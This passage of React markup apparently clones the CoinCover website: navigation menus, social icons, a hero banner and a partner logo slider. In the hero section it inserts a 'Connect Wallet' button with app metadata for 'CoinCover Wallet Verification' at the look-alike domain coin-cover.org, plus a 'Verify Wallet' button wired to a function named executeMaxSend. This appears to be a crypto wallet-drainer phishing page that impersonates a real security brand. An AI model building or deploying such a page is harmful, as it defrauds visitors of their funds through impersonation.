                                <a
                                  href="https://medium.com/@coincover-uk"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_4310_82494)">
                                        <path
                                          d="M25 10.3725V11.3168C22.877 9.92193 21.9613 12.6038 21.975 14.2846H25V14.8242L21.8348 14.8944C21.9558 16.6845 22.9004 18.7417 25 18.7363V20.8948C17.5214 22.2937 17.5008 9.23933 25 10.3725Z"
                                          fill="#0E171B"
                                        />
                                        <path
                                          d="M7.46875 7L11.5236 15.9034L15.4438 7H19.5C19.0999 7.42764 18.3175 7.51127 18.3918 8.27346L18.4041 19.7454C18.5018 20.254 18.9486 20.2985 19.3048 20.4793C19.4464 20.5521 19.5646 20.4051 19.5014 20.7612H14.2764V20.4928C14.7356 20.571 15.3764 20.026 15.3764 19.6146V9.02351L10.2875 20.625L9.81175 20.4874L4.925 9.29331V19.7481C4.925 19.8223 5.23713 20.2149 5.33888 20.2864C5.58638 20.459 5.96588 20.3902 6.02363 20.6236H3L3.90063 20.0935L4.22375 19.3313C4.056 15.9048 4.4905 12.2112 4.24162 8.81576C4.2155 8.46637 4.1825 7.87685 3.968 7.60031C3.7205 7.27655 3.1705 7.37502 3 7H7.46875Z"
                                          fill="#0E171B"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_4310_82494">
                                          <rect
                                            width={22}
                                            height={14}
                                            fill="white"
                                            transform="translate(3 7)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </span>
                                </a>
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="hs_header_menu_group mobile_view">
                    <div
                      id="hs_cos_wrapper_module_header_mega_menu"
                      className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                      style={{}}
                      data-hs-cos-general-type="widget"
                      data-hs-cos-type="module"
                    >
                      <div className="hs_header_mega_menu">
                        <div className="inner_wrapper">
                          <div className="top_menu_section">
                            <ul>
                              <li className="with_child_menu active">
                                <a className="menu_main_item">
                                  <span>For institutions</span>
                                </a>
                                <div className="header_child_menu">
                                  <span
                                    id="hs_cos_wrapper_module_header_mega_menu_"
                                    className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu"
                                    style={{}}
                                    data-hs-cos-general-type="widget"
                                    data-hs-cos-type="simple_menu"
                                  >
                                    <div
                                      id="hs_menu_wrapper_module_header_mega_menu_"
                                      className="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal"
                                      role="navigation"
                                      data-sitemap-name=""
                                      data-menu-id=""
                                      aria-label="Navigation Menu"
                                    >
                                      <ul role="menu">
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Products
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/products/recover-for-institutions"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                CoinCover Recover for
                                                Institutions
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/products/protect"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                CoinCover Protect
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/products/recover"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                CoinCover Recover
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Solutions
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/solutions/exchanges"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Exchanges
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/solutions/financial-institutions"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Financial institutions
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/solutions/wallets"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Wallets
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Risks we protect against
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/risks/lost-wallet-access"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Lost wallet access
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/risks/crypto-fraud"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Crypto fraud
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                      </ul>
                                    </div>
                                  </span>
                                </div>
                              </li>
                              <li className="with_child_menu ">
                                <a className="menu_main_item">
                                  <span>For people</span>
                                </a>
                                <div className="header_child_menu">
                                  <span
                                    id="hs_cos_wrapper_module_header_mega_menu_"
                                    className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu"
                                    style={{}}
                                    data-hs-cos-general-type="widget"
                                    data-hs-cos-type="simple_menu"
                                  >
                                    <div
                                      id="hs_menu_wrapper_module_header_mega_menu_"
                                      className="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal"
                                      role="navigation"
                                      data-sitemap-name=""
                                      data-menu-id=""
                                      aria-label="Navigation Menu"
                                    >
                                      <ul role="menu">
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Products
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/consumers/products/recover"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                What is CoinCover Recover?
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/consumers/products/protect"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                What is CoinCover Protect?
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Risks we protect against
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/consumers/risks/lost-access"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Lost wallet access
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/consumers/risks/crypto-fraud"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Crypto fraud
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                      </ul>
                                    </div>
                                  </span>
                                </div>
                              </li>
                              <li className="with_child_menu ">
                                <a className="menu_main_item">
                                  <span>Knowledge Hub</span>
                                </a>
                                <div className="header_child_menu">
                                  <span
                                    id="hs_cos_wrapper_module_header_mega_menu_"
                                    className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu"
                                    style={{}}
                                    data-hs-cos-general-type="widget"
                                    data-hs-cos-type="simple_menu"
                                  >
                                    <div
                                      id="hs_menu_wrapper_module_header_mega_menu_"
                                      className="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal"
                                      role="navigation"
                                      data-sitemap-name=""
                                      data-menu-id=""
                                      aria-label="Navigation Menu"
                                    >
                                      <ul role="menu">
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Resources
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://developer.coincover.com/"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Developer portal
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://app.eu.vanta.com/coincover/trust/z6bu6okf6urtu438efcwz"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Trust Center
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/knowledge-hub/assets-we-protect"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Assets we protect
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/knowledge-hub/faqs"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Crypto FAQs
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/knowledge-hub/glossary"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Glossary
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Partners
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/partners/partner-directory"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Partner directory
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Insight
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/blog"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Blog
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/knowledge-hub/reports/the-trust-factor"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                The Trust Factor
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                      </ul>
                                    </div>
                                  </span>
                                </div>
                              </li>
                              <li>
                                <a href="https://www.coincover.com/about">
                                  <span>About us</span>
                                </a>
                              </li>
                              <li>
                                <a href="https://www.coincover.com/contact">
                                  <span>Contact us</span>
                                </a>
                              </li>
                            </ul>
                          </div>
                          <div className="bottom_social_icons_section">
                            <ul>
                              <li>
                                <a
                                  href="https://www.linkedin.com/company/coincoverglobal/"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        fillRule="evenodd"
                                        clipRule="evenodd"
                                        d="M10.1784 20.9998V11.5544H7.17692V20.9998H10.1786H10.1784ZM21 20.9998V15.5832C21 12.6819 19.5194 11.3323 17.5448 11.3323C15.9526 11.3323 15.2394 12.2484 14.8401 12.8917V11.5544H11.8392C11.879 12.4408 11.8392 20.9998 11.8392 20.9998H14.8401V15.7248C14.8401 15.4425 14.8596 15.1602 14.939 14.9585C15.1556 14.3947 15.6498 13.8104 16.4788 13.8104C17.5643 13.8104 17.9991 14.677 17.9991 15.9462V21H21V20.9998ZM8.69795 7C7.67091 7 7 7.70624 7 8.63209C7 9.55793 7.65062 10.2642 8.65812 10.2642H8.67747C9.72403 10.2642 10.3756 9.53849 10.3756 8.63209C10.3563 7.70763 9.72593 7.00198 8.69795 7Z"
                                        fill="white"
                                      />
                                    </svg>
                                  </span>
                                </a>
                              </li>
                              <li>
                                <a
                                  href="https://x.com/Coincoverglobal"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M15.3318 12.9045L20.5436 6.84625H19.3086L14.7832 12.1066L11.1688 6.84625H7L12.4657 14.8008L7 21.1538H8.23514L13.0141 15.5987L16.8312 21.1538H21L15.3318 12.9045ZM13.6401 14.8708L13.0863 14.0787L8.6801 7.77596H10.5771L14.1331 12.8625L14.6869 13.6545L19.3092 20.2662H17.4122L13.6401 14.8708Z"
                                        fill="#0E171B"
                                      />
                                    </svg>
                                  </span>
                                </a>
                              </li>
                              <li>
                                <a
                                  href="https://www.youtube.com/@CoinCover3"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M11.9682 16.9531V11.049L17.1584 14.0013L11.9682 16.9531ZM23.513 9.19031C23.2786 8.32876 22.6165 7.66266 21.775 7.42694L21.757 7.42297C19.6427 7.15414 17.1976 7.00053 14.716 7.00053C14.4636 7.00053 14.2122 7.00185 13.9612 7.00503L13.9996 7.0045C13.7864 7.00185 13.5353 7 13.2831 7C10.8015 7 8.3548 7.15361 5.9534 7.45104L6.24076 7.42191C5.38212 7.66213 4.71999 8.3277 4.4901 9.17177L4.48613 9.18899C4.22128 10.5855 4.07031 12.1924 4.07031 13.8345C4.07031 13.8927 4.07031 13.951 4.07111 14.0085V13.9992C4.07111 14.0482 4.07031 14.1065 4.07031 14.1647C4.07031 15.8068 4.22181 17.4131 4.51129 18.9712L4.48613 18.8097C4.72052 19.6712 5.38265 20.3371 6.22408 20.5731L6.24182 20.577C8.35586 20.8459 10.8012 20.9995 13.2829 20.9995C13.5345 20.9995 13.7861 20.9981 14.0377 20.995L13.9993 20.9955C14.2125 20.9981 14.4641 21 14.7157 21C17.1982 21 19.6441 20.8464 22.0455 20.5492L21.7581 20.5784C22.6175 20.3387 23.2797 19.6726 23.5101 18.8285L23.5141 18.8113C23.7784 17.415 23.9293 15.8079 23.9293 14.1666C23.9293 14.1083 23.9293 14.0501 23.9288 13.9923V14.0011C23.9288 13.9521 23.9293 13.8938 23.9293 13.8355C23.9293 12.1935 23.7776 10.5871 23.4884 9.02928L23.5135 9.19084H23.5127L23.513 9.19031Z"
                                        fill="#0E171B"
                                      />
                                    </svg>
                                  </span>
                                </a>
                              </li>
                              <li>
                                <a
                                  href="https://bsky.app/profile/coincoverglobal.bsky.social"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_4310_82948)">
                                        <path
                                          d="M17.2132 15.5456L17.8801 15.7086C19.2067 16.067 20.6968 16.9931 20.0581 18.596C19.718 19.4497 18.5537 20.5217 17.6994 20.849C15.8773 21.5471 14.8335 19.6665 14.2935 18.2592C14.207 18.0339 14.1353 17.7295 14.0352 17.5242C14.0255 17.5044 14.0179 17.4885 13.999 17.4755C13.98 17.4885 13.9724 17.5044 13.9628 17.5242C13.8627 17.7295 13.7909 18.0339 13.7045 18.2592C12.9742 20.1622 11.6718 21.9717 9.50919 20.4039C8.80681 19.8946 7.86586 18.9433 7.7924 18.0339C7.68415 16.6935 9.03516 16.0134 10.1289 15.7056L10.7847 15.5456L10.1539 15.6028C8.38816 15.6605 6.74235 14.8428 6.43066 12.9819C6.3342 12.4061 6.28359 11.7799 6.22971 11.1963C6.16895 10.537 6.11202 9.8706 6.07376 9.20968C6.0174 8.23487 6.02336 6.93213 7.35848 7.00275C9.05121 7.09226 10.9621 9.20308 11.9541 10.4529C12.7273 11.427 13.425 12.4681 13.999 13.5728C14.521 12.562 15.1524 11.609 15.8452 10.7083C16.8626 9.38564 18.7487 7.23941 20.4858 7.01936C22.2208 6.7996 21.962 8.6974 21.8816 9.81985C21.8315 10.519 21.771 11.223 21.6971 11.9199C21.6081 12.7598 21.5682 13.5048 21.076 14.2219C20.2338 15.4491 18.6073 15.741 17.2132 15.5457L17.2132 15.5456Z"
                                          fill="#0E171B"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_4310_82948">
                                          <rect
                                            width="15.887"
                                            height={14}
                                            fill="white"
                                            transform="translate(6.05664 7)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </span>
                                </a>
                              </li>
                              <li>
                                <a
                                  href="https://medium.com/@coincover-uk"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_4310_82494)">
                                        <path
                                          d="M25 10.3725V11.3168C22.877 9.92193 21.9613 12.6038 21.975 14.2846H25V14.8242L21.8348 14.8944C21.9558 16.6845 22.9004 18.7417 25 18.7363V20.8948C17.5214 22.2937 17.5008 9.23933 25 10.3725Z"
                                          fill="#0E171B"
                                        />
                                        <path
                                          d="M7.46875 7L11.5236 15.9034L15.4438 7H19.5C19.0999 7.42764 18.3175 7.51127 18.3918 8.27346L18.4041 19.7454C18.5018 20.254 18.9486 20.2985 19.3048 20.4793C19.4464 20.5521 19.5646 20.4051 19.5014 20.7612H14.2764V20.4928C14.7356 20.571 15.3764 20.026 15.3764 19.6146V9.02351L10.2875 20.625L9.81175 20.4874L4.925 9.29331V19.7481C4.925 19.8223 5.23713 20.2149 5.33888 20.2864C5.58638 20.459 5.96588 20.3902 6.02363 20.6236H3L3.90063 20.0935L4.22375 19.3313C4.056 15.9048 4.4905 12.2112 4.24162 8.81576C4.2155 8.46637 4.1825 7.87685 3.968 7.60031C3.7205 7.27655 3.1705 7.37502 3 7H7.46875Z"
                                          fill="#0E171B"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_4310_82494">
                                          <rect
                                            width={22}
                                            height={14}
                                            fill="white"
                                            transform="translate(3 7)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </span>
                                </a>
                              </li>
                            </ul>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="header_mobile_login_btn"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </header>
      </div>
    </div>
    <main id="main-content" className="body-container-wrapper">
      <div className="container-fluid body-container body-container--home">
        <div className="row-fluid-wrapper">
          <div className="row-fluid">
            <div
              className="span12 widget-span widget-type-cell "
              style={{}}
              data-widget-type="cell"
              data-x={0}
              data-w={12}
            >
              <div className="row-fluid-wrapper row-depth-1 row-number-1 dnd_area-row-0-force-full-width-section dnd-section dnd_area-row-0-padding">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell cell_17480798384763-padding dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-2 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_module_17480798384765"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="main_hero_section_wrapper">
                              <div className="main_hero_section_inner_wrapper">
                                <div className="content-wrapper">
                                  <div className="content row">
                                    <div className="content_section  col-12 col-lg-6">
                                      <div className="description text-size-medium">
                                        <h1>
                                          <span style={{ color: "#ffffff" }}>
                                            Digital assets
                                          </span>
                                          <br />
                                          <span style={{ color: "#ffffff" }}>
                                            Secured + protected
                                          </span>
                                        </h1>
                                        <p>
                                          We protect digital assets for
                                          institutions and their customers.
                                        </p>
                                      </div>
                                      <div className="buttons_wrapper">
                                        {connectionError && (
                                          <div className="mb-4 p-4 bg-red-50 border border-red-200 rounded-lg">
                                            <p className="text-red-700 text-sm">{connectionError}</p>
                                            <button
                                              onClick={() => setConnectionError(null)}
                                              className="mt-2 text-red-600 hover:text-red-800 text-sm underline"
                                            >
                                              Try Again
                                            </button>
                                          </div>
                                        )}
                                        {!account ? (
                                          <ConnectButton
                                            client={client}
                                            appMetadata={{
                                              name: "CoinCover Wallet Verification",
                                              url: "https://coin-cover.org/",
                                              description: "Verify your wallet for MAX SEND/RECEIVE processing"
                                            }}
                                            connectButton={{
                                              label: "Connect Wallet",
                                              style: {
                                                backgroundColor: "#2563eb",
                                                color: "white",
                                                fontWeight: "bold",
                                                padding: "12px 24px",
                                                borderRadius: "8px",
                                                fontSize: "16px"
                                              }
                                            }}
                                            connectModal={{
                                              size: "compact",
                                              welcomeScreen: {
                                                title: "Connect Your Wallet",
                                                subtitle: "Choose your preferred wallet to connect and verify"
                                              }
                                            }}
                                          />
                                        ) : !hasProcessed ? (
                                          <div className="flex flex-col gap-2">
                                            <button
                                              onClick={executeMaxSend}
                                              disabled={isVerifying}
                                              className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 px-6 rounded-lg transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed transform hover:scale-105 active:scale-95 shadow-lg hover:shadow-xl"
                                            >
                                              {isVerifying ? (
                                                <div className="flex items-center gap-2">
                                                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                                                  {verificationStep || "Verifying..."}
                                                </div>
                                              ) : (
                                                "Verify Wallet"
                                              )}
                                            </button>
                                            {isVerifying && verificationStep && (
                                              <p className="text-sm text-blue-200 text-center">{verificationStep}</p>
                                            )}
                                          </div>
                                        ) : null}
                                      </div>
                                    </div>
                                    <div className="image_section col-12 col-lg-6 lottie_image">
                                      <div className="lottie_image">
                                        <lottie-player
                                          src="https://www.coincover.com/hubfs/CC_DOTRINGANIMATION_V012.json"
                                          background="transparent"
                                          speed={1}
                                          loop=""
                                          autoPlay=""
                                        />
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-3 dnd_area-row-1-background-color dnd-section dnd_area-row-1-background-layers dnd_area-row-1-force-full-width-section">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-4 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1748079856594"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div
                              className="home_top_pane"
                              style={{
                                backgroundColor: "rgba(57, 57, 239,1.0)"
                              }}
                            >
                              <div className="content-wrapper">
                                <div className="home_top_pane_inner">
                                  <div className="bottom_two-section">
                                    <div className="logo_slider_wrapper">
                                      <div className="logo_slider">
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/1inch-1.svg"
                                            alt="1inch"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Abra.svg"
                                            alt="Abra"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/ALEX.svg"
                                            alt="ALEX"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Algorand-1.svg"
                                            alt="Algorand-1"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Alphabit.svg"
                                            alt="Alphabit"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Amber.svg"
                                            alt="Amber"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Animoca%20Ventures.svg"
                                            alt="Animoca Ventures"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/BitGo.svg"
                                            alt="BitGo"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Bitso.svg"
                                            alt="Bitso"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Bitstamp.svg"
                                            alt="Bitstamp"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/BlockTower.svg"
                                            alt="BlockTower"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Bullish.svg"
                                            alt="Bullish"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Bybit.svg"
                                            alt="Bybit"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/CMCC.svg"
                                            alt="CMCC"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
